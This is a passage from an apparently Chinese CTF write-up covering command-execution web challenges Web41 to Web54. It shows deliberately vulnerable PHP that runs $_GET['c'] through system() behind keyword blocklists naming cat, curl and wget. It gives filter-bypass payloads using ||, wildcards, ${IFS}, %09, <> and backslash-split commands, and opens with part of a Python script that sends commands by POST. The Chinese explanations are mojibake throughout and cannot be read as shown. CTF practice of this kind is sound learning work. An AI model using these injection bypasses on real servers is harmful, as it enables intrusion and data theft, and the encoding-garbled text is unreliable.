class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><h1 id="web42"><a class="markdownIt-Anchor" href="#web42">#</a> Web42ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¯¹äºè¿™é‡Œçš„ï¼Œå¯ä»¥å‚è€ƒä¸‹ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGlueXdhbi9wLzYwMjU0NjguaHRtbA==">     Shell è„šæœ¬ â€”â€”â€”â€” /dev/null 2&gt;&amp;1 è¯¦è§£ </span></p><p>â€‹è¿™é‡Œå¦‚æœåªæ˜¯æƒ³è¦è§£é¢˜çš„è¯ï¼Œå¯ä»¥æƒ³åŠæ³•è®©åé¢çš„ä¸æ‰§è¡Œï¼Œæˆ–è€…å‰ååˆ†ç¦»å¼€å°±è¡Œäº†ï¼Œè¿™é‡Œæœ‰å¦‚ä¸‹å‡ ç§æ–¹æ³•ï¼š</p><blockquote><p>; // åˆ†å·<br> | // åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤<br> || // åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤<br> &amp; // ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ<br> &amp;&amp; // ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p></blockquote><h1 id="web43"><a class="markdownIt-Anchor" href="#web43">#</a> Web43ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¯¹æ¯”ä¸Šä¸€é¢˜ï¼Œå¤šäº†ä¸€å±‚è¿‡æ»¤ï¼Œå¤šäº†ä¸€ä¸ª cat å’Œåˆ†å·ï¼Œè€æ ·å­ï¼ŒåŒä¸€ä¸ª payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac fla* ||</span><br></pre></td></tr></table></figure><p>â€‹å†ä¸€æ¬¡ï¼Œè´´ä¸€ä¸‹å¯ä»¥ç»•è¿‡çš„æ–¹å¼ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=more flag.php||</span><br><span class="line">?c=sort flag.php||</span><br><span class="line">?c=less flag.php||</span><br><span class="line">?c=tac flag.php||</span><br><span class="line">?c=tail flag.php||</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">?c=strings flag.php||</span><br></pre></td></tr></table></figure><h1 id="web44"><a class="markdownIt-Anchor" href="#web44">#</a> Web44ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¤šè¿‡æ»¤äº† flagï¼Œé€šé…ç¬¦ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac f* ||</span><br></pre></td></tr></table></figure><h1 id="web45"><a class="markdownIt-Anchor" href="#web45">#</a> Web45ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†ç©ºæ ¼ï¼Œè€æ ·å­ï¼ŒIFS ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=tac<span class="built_in">$</span>&#123;IFS&#125;fla*||</span><br></pre></td></tr></table></figure><h1 id="web46"><a class="markdownIt-Anchor" href="#web46">#</a> Web46ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†ç©ºæ ¼å’Œæ˜Ÿå·ï¼Œæ˜Ÿå·ç›´æ¥ç”¨é—®å·ç»•è¿‡ï¼Œç©ºæ ¼ä½¿ç”¨ %09 ç»•è¿‡ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac<span class="comment">%09fla?.php|| #è¿™é‡Œçš„%09ä¸å±äºæ•°å­—</span></span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†ç©ºæ ¼ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` é‡å®šå‘ç¬¦</span><br><span class="line">`<span class="comment">%09`(éœ€è¦phpç¯å¢ƒ)</span></span><br><span class="line">`<span class="built_in">$</span>&#123;IFS&#125;`</span><br><span class="line">`<span class="built_in">$</span>IFS<span class="built_in">$</span>9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><br><span class="line">`<span class="comment">%20`</span></span><br><span class="line">`<span class="comment">%09</span></span><br></pre></td></tr></table></figure><h1 id="web47"><a class="markdownIt-Anchor" href="#web47">#</a> Web47ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†é™¤äº† tac ä»¥å¤–çš„å¾ˆå¤§ä¸€éƒ¨åˆ†è¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œflag ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿˜æœ‰ç©ºæ ¼å’Œæ˜Ÿå·ï¼Œç»•è¿‡æ–¹å¼å’Œä¸Šä¸€ä¸ªä¸€æ ·ï¼š</p><blockquote><p>c=tac%09fla?.php||</p></blockquote><h1 id="web48"><a class="markdownIt-Anchor" href="#web48">#</a> Web48ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ä¸æ˜¯ï¼Œæ€ä¹ˆå¤šäº†è¿™ä¹ˆå¤šä¸è®¤è¯†çš„å‘½ä»¤ï¼Ÿ</p><p>â€‹ä¸è¿‡æ— æ‰€è°“ï¼Œå‘ç°è¿˜æ˜¯è€æ ·å­ï¼Œtacã€ç®¡é“ç¬¦å’Œé—®å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç›´æ¥æ— è„‘å†²ï¼š</p><blockquote><p>c=tac%09fla?.php||</p></blockquote><h1 id="web49"><a class="markdownIt-Anchor" href="#web49">#</a> Web49ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰è¿‡æ»¤ tacï¼Œä½†æ˜¯è¿‡æ»¤äº†ç™¾åˆ†å·ï¼Œä¸è¿‡è¿™é‡Œæ— ä¼¤å¤§é›…ï¼Œå› ä¸º %09 ä¸ä¼šè¢«å½“ä½œ %ï¼Œæ‰€ä»¥ç›´æ¥</p><blockquote><p>?c=tac%09fla?.php||</p></blockquote><h1 id="web50"><a class="markdownIt-Anchor" href="#web50">#</a> Web50ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸¸è¾£ï¼Œè¿‡æ»¤äº† \x09ï¼Œæ²¡æ³•è¿‡äº†ï¼Œé‚£å°±ä½¿ç”¨ &lt;&gt; æ¥ç»•è¿‡ï¼Œä¸è¿‡ï¼Œ&lt;&gt; å’Œé€šé…ç¬¦ï¼Ÿä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ä¸å›æ˜¾ï¼Œæ‰€ä»¥ç”¨åæ–œæ ç»•è¿‡å…³é”®å­— flagï¼š</p><blockquote><p>?c=tac&lt;&gt;fla\g.php||</p></blockquote><h1 id="web51"><a class="markdownIt-Anchor" href="#web51">#</a> Web51ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é ï¼Œtac è¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡æ— æ‰€è°“ï¼Œsystem å‡½æ•°åœ¨æŸäº›æ—¶å€™å¯ä»¥ç”¨åæ–œæ æ¥åˆ†å‰²å…³é”®å­—ï¼Œç›´æ¥ä¸€æŠŠæ¢­ï¼š</p><blockquote><p>?c=ta\c&lt;&gt;fla\g.php||</p></blockquote><h1 id="web52"><a class="markdownIt-Anchor" href="#web52">#</a> Web52ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ä¸¸è¾£ï¼Œè¿™é‡Œè¿‡æ»¤äº†å¤§å°äºç¬¦å·ï¼Œä¸è¿‡ï¼Œçªç„¶å‘ç°å¥½åƒæ²¡æœ‰è¿‡æ»¤æ‰ $ ç¬¦å·ï¼Œå¾ˆå¥½ï¼Œç›´æ¥ IFS ç»•è¿‡ã€‚</p><blockquote><p>?c=ta\c${IFS}fla\g.php||</p><p>?c=ta\c${IFS}flâ€™'ag.php||</p></blockquote><p>â€‹ä¸è¿‡æ²¡æœ‰æ‰¾åˆ° flagï¼Œflag ä¼šåœ¨å“ªé‡Œå‘¢ï¼Ÿåœ¨æ ¹ç›®å½•æ‰¾åˆ°äº† flagã€‚</p><h1 id="web53"><a class="markdownIt-Anchor" href="#web53">#</a> Web53ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹æ²¡å•¥è¯´çš„ï¼ŒIFS ç»•è¿‡ä¸€æŠŠæ¢­ï¼š</p><blockquote><p>?c=ta\c${IFS}fla\g.php</p></blockquote><h1 id="web54"><a class="markdownIt-Anchor" href="#web54">#</a> Web54ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™åˆæ˜¯å•¥æ­£åˆ™ï¼Ÿai çš„è§£é‡Šå¦‚ä¸‹ï¼ˆéƒ¨åˆ†æ­£ç¡®ï¼Œä¸å¯å…¨ä¿¡ï¼‰ï¼š</p><blockquote><p>è¿™è¡Œä»£ç æ˜¯ä½¿ç”¨ PHP çš„ <code>preg_match</code>  å‡½æ•°æ¥æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆå‡è®¾ä¸ºå˜é‡ <code>$c</code> ï¼‰æ˜¯å¦åŒ…å«ä¸€ç³»åˆ—ç‰¹å®šçš„æ¨¡å¼æˆ–å­—ç¬¦ã€‚è¿™äº›æ¨¡å¼é€šå¸¸ä¸å°è¯•ç»•è¿‡å®‰å…¨é™åˆ¶ã€æ³¨å…¥æ¶æ„ä»£ç æˆ–æ‰§è¡Œä¸æœŸæœ›çš„å‘½ä»¤æœ‰å…³ã€‚ä¸‹é¢æ˜¯å¯¹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸­å„ä¸ªéƒ¨åˆ†çš„è§£é‡Šï¼š</p><ol><li><code>\;</code> ï¼šæŸ¥æ‰¾åˆ†å·ï¼ˆ <code>;</code> ï¼‰ï¼Œè¿™é€šå¸¸ç”¨äºå‘½ä»¤åˆ†éš”ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½è¢«ç”¨äºå°è¯•æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚</li><li><code>.*c.*a.*t.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>cat</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>cat</code>  æ˜¯ä¸€ä¸ªå¸¸ç”¨äº Unix/Linux ç³»ç»Ÿä¸­æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ã€‚</li><li><code>.*f.*l.*a.*g.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>flag</code>  çš„å­—ç¬¦ä¸²ï¼Œè¿™å¯èƒ½æ˜¯åœ¨å°è¯•è·å–æŸç§ â€œæ ‡å¿—â€ æˆ–æ•æ„Ÿä¿¡æ¯ã€‚</li><li><code> [0-9]</code> ï¼šæŸ¥æ‰¾ç©ºæ ¼åè·Ÿä»»ä½•æ•°å­—ï¼Œè¿™å¯èƒ½æ˜¯åœ¨å°è¯•ç»•è¿‡åŸºäºç‰¹å®šå­—ç¬¦çš„é™åˆ¶ã€‚</li><li><code>\*</code> ï¼šæŸ¥æ‰¾æ˜Ÿå·ï¼ˆ <code>*</code> ï¼‰ï¼Œåœ¨æŸäº›ä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒå¯èƒ½ç”¨äºé€šé…ç¬¦åŒ¹é…æˆ–å…·æœ‰ç‰¹æ®Šæ„ä¹‰ã€‚</li><li><code>.*m.*o.*r.*e.*</code> ã€ <code>.*w.*g.*e.*t.*</code> ã€ <code>.*l.*e.*s.*s.*</code>  ç­‰ï¼šè¿™äº›æ¨¡å¼åˆ†åˆ«æŸ¥æ‰¾åŒ…å« <code>more</code> ã€ <code>wget</code> ã€ <code>less</code>  ç­‰å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å‘½ä»¤é€šå¸¸ç”¨äºæ–‡ä»¶æ“ä½œæˆ–æ•°æ®ä¼ è¾“ã€‚</li><li><code>.*h.*e.*a.*d.*</code> ã€ <code>.*s.*o.*r.*t.*</code> ã€ <code>.*t.*a.*i.*l.*</code>  ç­‰ï¼šæŸ¥æ‰¾åŒ…å« <code>head</code> ã€ <code>sort</code> ã€ <code>tail</code>  ç­‰ Unix/Linux å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å‘½ä»¤ç”¨äºå¤„ç†æ–‡æœ¬æ•°æ®ã€‚</li><li><code>.*s.*e.*d.*</code> ã€ <code>.*c.*u.*t.*</code> ã€ <code>.*t.*a.*c.*</code>  ç­‰ï¼šæŸ¥æ‰¾åŒ…å« <code>sed</code> ã€ <code>cut</code> ã€ <code>tac</code>  ç­‰å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å‘½ä»¤ç”¨äºæ–‡æœ¬å¤„ç†ã€‚</li><li><code>.*a.*w.*k.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>awk</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>awk</code>  